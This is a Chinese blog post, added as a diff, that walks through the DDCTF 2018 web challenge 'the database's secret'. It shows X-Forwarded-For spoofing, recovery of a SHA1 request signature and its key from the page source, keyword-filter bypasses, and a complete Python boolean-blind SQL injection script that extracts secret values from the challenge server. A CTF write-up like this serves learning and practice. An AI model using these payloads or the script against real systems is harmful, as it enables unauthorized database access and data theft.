@@ -1,0 +1,153 @@
+---
+layout:     post
+title:      "DDCTF —— 数据库的秘密"
+subtitle:   ""
+date:       2018-04-24 13:14:00
+author:     "kuron3k0"
+header-img: "img/post-bg-rwd.jpg"
+tags:
+    - SQL-Injection
+    - CTF
+    - WEB
+---
+
+
+打开题目，提示特定ip才能连接
+![](/img/in-post/post-ddctf-web/ip.png)
+<br>
+
+加上`X-Forwarded-For`
+![](/img/in-post/post-ddctf-web/xff.png)
+<br>
+
+得到如下页面，很明显是查询中的注入问题
+![](/img/in-post/post-ddctf-web/origin.png)
+<br>    
+
+但是发现url参数中带有sig，在burpsuite中随意修改post参数会返回`sig error`
+![](/img/in-post/post-ddctf-web/sig_error.png)
+<br>
+
+F12查看search按钮触发的js是`submitt`函数
+![](/img/in-post/post-ddctf-web/submit.png)
+<br>
+
+具体相关代码如下：<br>
+
+```javascript
+
+function submitt(){
+	obj['id']=document.getElementById('id').value;
+	obj['title']=document.getElementById('title').value;
+	obj['author']=document.getElementById('author').value;
+	obj['date']=document.getElementById('date').value;
+	var sign=signGenerate(obj,key);
+	document.getElementById('queryForm').action="index.php?sig="+sign+"&time="+obj.time;
+	document.getElementById('queryForm').submit()
+}
+
+function signGenerate(obj,key){
+	var str0='';
+	for(i in obj){
+		if(i!='sign'){
+			str1='';
+			str1=i+'='+obj[i];
+			str0+=str1
+		}
+	}
+	return hex_math_enc(str0+key)
+};
+```
+注：生成签名的`key`可在页面源码中找到
+![](/img/in-post/post-ddctf-web/key.png)
+<br>
+
+跟着进入`hex_math_enc`函数，是在`static/math.js`中
+![](/img/in-post/post-ddctf-web/sign.png)
+<br>
+
+……这让人头皮发麻的函数，有两种处理方法：
+
+    - 用python实现再进行注入（不可能的这辈子都不可能的，依稀记得之前做过一条调试一万多行js的题目= =）
+    - 在本地用js生成sig，用脚本访问本地页面先把sig拿到再进行注入，但是python的request又不会跑js代码，所以只能用`PhantomJS+Selenium`
+<br>
+
+但是觉得不太可能啊，怎么可能这么麻烦，再回头看看js文件，发现如下信息：
+![](/img/in-post/post-ddctf-web/sha1.png)
+<br>
+
+原来是`sha1`……论看清题目的重要性……<br>
+然后就是常规注入了，题目过滤了一些关键字，如`or`，换成`||`即可。<br>
+还有在读数据表的时候，发现好像过滤了`database(`……，试了在`database`两边加反引号、在后面加空格、加注释，都失败了，所以只能limit一个一个读……不过根据数据库的特性我们自己的表都是跟在系统表后面，所以倒着来读即可，时间上可以接受。
+
+附脚本：
+
+```python
+import requests
+import re
+import hashlib
+import time
+
+base_url = 'http://116.85.43.88:8080/PEQFGTUTQMZWCZGK/dfe3ia/index.php'
+
+header = {
+    'X-Forwarded-For':'123.232.23.245'
+}
+
+def getLength(index):
+    for i in range(0,1000):
+        data = {
+            'id':'',
+            'title':'',
+            'author':'admin\'||if(length((select secvalue from ctf_key1 limit {},1))>{},1,0)#'.format(index,i),
+            'date':''
+        }
+        t = str(int(time.time()))
+        s = "id={}title={}author={}date={}time={}adrefkfweodfsdpiru".format(
+            data['id'],
+            data['title'],
+            data['author'],
+            data['date'],
+            t
+        )
+        sha1hash = hashlib.sha1(s).hexdigest()
+        res = requests.post(url=base_url+"?sig={}&time={}".format(sha1hash,t),data=data,headers=header)
+        if 'test<' not in res.text.decode('utf-8'):
+            return i
+        else:
+            print i
+
+
+def getContent(index,length):
+    session = requests.session()
+    ans = ''
+    for i in range(1,length+1):
+        for st in range(0,256):
+            data = {
+                'id':'',
+                'title':'',
+                'author':'admin\'||if(ascii(mid((select secvalue from ctf_key1 limit {},1),{},1))>{},1,0)#'.format(index,i,st),
+                'date':''
+            }
+            t = str(int(time.time()))
+            s = "id={}title={}author={}date={}time={}adrefkfweodfsdpiru".format(
+                data['id'],
+                data['title'],
+                data['author'],
+                data['date'],
+                t
+            )
+            sha1hash = hashlib.sha1(s).hexdigest()
+            res = session.post(url=base_url+"?sig={}&time={}".format(sha1hash,t),data=data,headers=header)
+            if 'test<' not in res.text.decode('utf-8'):
+                ans+=chr(int(st))
+                print ans
+                break
+
+for i in range(0,30):
+    LENGTH = getLength(i)
+    getContent(i,LENGTH)
+
+
+
+```
